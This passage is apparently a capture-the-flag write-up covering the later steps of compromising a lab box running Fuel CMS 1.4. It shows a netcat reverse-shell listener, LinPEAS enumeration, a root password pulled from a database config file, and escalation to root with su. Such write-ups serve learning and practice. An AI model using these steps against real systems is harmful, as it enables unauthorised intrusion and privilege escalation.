## 🐚 Step 3: Exploitation (Got Reverse Shell)

I executed the exploit and successfully gained a reverse shell.

Listener used:

```bash
rlwrap nc -lvnp 443

Shell access was received as:
whoami
www-data

🚩 Step 4: Privilege Enumeration (LinPEAS)
After gaining the shell, I uploaded and executed LinPEAS for privilege escalation enumeration.
chmod +x linpeas.sh
./linpeas.sh

From LinPEAS output, I found the first flag.

🔑 Step 5: Root Password Found
In the same LinPEAS output, I discovered root credentials stored inside a PHP configuration file:
File location:
/var/www/html/fuel/application/config/database.php

Password found:
'password' => 'mememe',

👑 Step 6: Privilege Escalation (Root Access)
Using the discovered password, I switched to root:
su root

Then I accessed the root directory and captured the root flag.
cd /root
ls
cat root.txt

✅ Conclusion
Successfully exploited Fuel CMS 1.4 using public RCE exploit, gained www-data shell, enumerated system using LinPEAS, found stored credentials, escalated privileges to root, and captured the final root flag.

🏁 Flags Captured
